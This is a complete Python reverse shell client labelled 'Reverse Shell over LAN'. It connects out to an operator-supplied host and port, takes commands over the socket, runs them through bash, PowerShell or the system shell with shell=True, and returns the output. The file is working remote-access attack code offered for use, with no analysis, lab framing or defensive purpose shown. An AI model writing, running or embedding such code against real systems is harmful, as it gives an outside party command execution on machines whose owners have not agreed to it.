import socket
import subprocess
import argparse

def connect_to_server(host, port, shell_type):
    try:
        # Create a socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
        print(f"Connected to {host}:{port}")

        # Interactive shell loop
        while True:
            client_socket.send(f"{shell_type}> ".encode())
            command = client_socket.recv(1024).decode().strip()

            if command.lower() in {"exit", "quit"}:
                print("Connection closed by server.")
                break

            if shell_type == "bash":
                command = f"bash -c '{command}'"
            elif shell_type == "powershell":
                command = f"powershell -Command {command}"
            
            try:
                # Execute the command
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
            except Exception as e:
                output = f"Error executing command: {e}"

            if not output:
                output = "[No output]\n"

            client_socket.send(output.encode())
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()


def main():
    parser = argparse.ArgumentParser(description="Reverse Shell over LAN")
    parser.add_argument("--host", required=True, help="The IP address of the server to connect to")
    parser.add_argument("--port", type=int, required=True, help="The port of the server to connect to")
    parser.add_argument("--shell", choices=["cli", "bash", "powershell"], required=True, help="Type of shell to use")
    args = parser.parse_args()

    connect_to_server(args.host, args.port, args.shell)


if __name__ == "__main__":
    main()

